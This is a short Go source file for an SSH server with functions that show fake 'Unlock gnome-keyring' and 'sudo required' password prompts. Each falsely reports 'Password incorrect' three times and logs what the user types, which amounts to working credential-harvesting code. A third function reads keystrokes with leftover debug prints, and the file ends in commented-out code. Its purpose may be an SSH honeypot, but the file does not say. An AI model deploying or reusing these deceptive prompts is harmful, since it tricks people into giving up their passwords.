package main

import (
	"bufio"
	"fmt"
	"io"
	"log"
	"strings"
	"text/scanner"
	"time"

	"golang.org/x/crypto/ssh"
)

func gnomeKeychainTrick(channel ssh.Channel) {
	io.WriteString(channel, "Unlock gnome-keyring\r\npassword: ")
	bio := bufio.NewReader(channel)
	for i := 0; i < 3; i++ {
		time.Sleep(1 * time.Second)
		io.WriteString(channel, "\r\n Password incorrect \r\npassword: ")
		keychainPassword, _ := bio.ReadString('\r')
		log.Printf("gnome-keyring password: %s", keychainPassword)
	}
}

func sudoPermissionsRequiredTrick(channel ssh.Channel) {
	io.WriteString(channel, "sudo required for ssh connection\r\npassword: ")
	bio := bufio.NewReader(channel)
	for i := 0; i < 3; i++ {
		time.Sleep(2 * time.Second)
		io.WriteString(channel, "\r\n Password incorrect \r\npassword: ")
		keychainPassword, _ := bio.ReadString('\r')
		log.Printf("sudo password: %s", keychainPassword)
	}
}

func signalsTrick(channel ssh.Channel) {
	var s scanner.Scanner
	s.Init(channel)
	s.Mode = scanner.ScanChars
	io.WriteString(channel, "ubuntu string")
	var received strings.Builder

	for {
		tok := s.Scan()

		if tok == '\x03' {
			break
		}
		if tok == '\x04' {
			break
		}
		received.WriteRune(tok)
		if len(received.String()) > 3 {
			fmt.Println("blah", string(received.String()[len(received.String())-4:]))
		}
		if len(received.String()) > 3 &&
			string(received.String()[len(received.String())-4:]) == "exit" {
			break
		}

		fmt.Println(received.String())
		fmt.Println(tok)
		fmt.Printf("%s: %s\n", s.Position, s.TokenText())

		fmt.Printf("%s: %s\n", s.Position, s.TokenText())
	}

	// io.WriteString(channel, "ubuntu string")
	// bio := bufio.NewReader(channel)

	// bio.ReadString('\x03')
	// io.WriteString(channel, "\r\n/home/ $ ")
	// // echo each character
	// for {
	// 	r, _, _ := bio.ReadRune()
	// 	if r == '\r' {
	// 		break
	// 	}
	// 	io.WriteString(channel, string(r))
	// }
	// io.WriteString(channel, "\r\n")

}
